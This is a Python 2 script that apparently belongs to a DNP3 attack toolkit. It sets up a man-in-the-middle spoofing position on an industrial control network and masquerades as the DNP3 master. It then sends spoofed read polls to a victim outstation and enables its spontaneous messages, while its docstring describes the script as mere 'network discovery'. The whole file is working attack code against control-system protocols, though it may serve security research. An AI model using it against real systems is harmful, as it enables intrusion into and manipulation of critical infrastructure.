__author__ = 'Nicholas Rodofile'
from DNP3_Master import *

class DNP3_Master_Masquerading(Master):
    def __init__(self, node, port, timeout_time=2*60):
        Master.__init__(self, node, port, timeout_time)

    def poll_slave(self):
        polling_list = ['read_request_class0123', 'read_requestClass1', 'read_requestClass2',
                        'read_requestClass3']
        for req in polling_list:
            print req
            poll_read = self.node.spoofer.masquerade([appFuncCode["READ"], req])
            self.queue_out.put(poll_read)
            time.sleep(2)

    def masquerade(self):
        # while not self.enable_config_slave and self.running:
        #self.discovery_frame()
        #    pass
        while self.running:
            # if not self.enable_config_slave_write:
            #     self.record_current_time()
            #     time.sleep(2)
            #     self.write_time()
            #     time.sleep(2)
            #     pass
            # if not self.enable_spontaneous_msg:
            #     self.enable_spontaneous()
            #     time.sleep(1)
            #     pass
            #time.sleep(1)
            self.poll_slave()

    def automation(self):
        while not self.running:
            pass
        if self.running:
            self.record_current_time()
            time.sleep(2)
            self.enable_spontaneous()
            time.sleep(1)
            print "Masquerading"
            self.masquerade()
        else:
            print "fail Masquerading"

if __name__ == '__main__':
    """
    This Script is used to perform network discovery on DNP3 slaves
    """

    DNP3_nodes_found = []
    mitm = DNP3_MITM_conf(interface='eth0')
    mitm.init_spoofing()
    victim = mitm.victim
    master = DNP3_Master_Masquerading(victim, dnp3_port)
    DNP = master.start()